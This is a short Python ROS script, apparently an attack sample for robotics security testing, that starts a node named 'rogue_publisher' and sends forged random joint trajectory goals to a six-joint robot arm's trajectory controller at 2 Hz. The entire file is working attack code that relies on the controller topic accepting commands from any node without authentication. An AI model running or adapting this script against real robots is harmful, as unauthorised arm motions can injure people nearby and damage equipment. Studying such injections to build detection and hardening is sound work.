#!/usr/bin/env python3
"""Unauthorized publish: a rogue node sends forged goals to the trajectory controller at 2 Hz."""
import random, rospy
from trajectory_msgs.msg import JointTrajectory, JointTrajectoryPoint
J = ["shoulder_pan_joint", "shoulder_lift_joint", "elbow_joint", "wrist_1_joint", "wrist_2_joint", "wrist_3_joint"]
rospy.init_node("rogue_publisher", anonymous=True)
pub = rospy.Publisher("/eff_joint_traj_controller/command", JointTrajectory, queue_size=10)
rng = random.Random(0); r = rospy.Rate(2)
while not rospy.is_shutdown():
    m = JointTrajectory(); m.joint_names = J
    q = [rng.uniform(-0.3, 0.3), -1.57 + rng.uniform(-0.2, 0.2), 1.57, -1.57, -1.57, rng.uniform(-0.5, 0.5)]
    m.points.append(JointTrajectoryPoint(positions=q, time_from_start=rospy.Duration(1.0)))
    pub.publish(m); r.sleep()
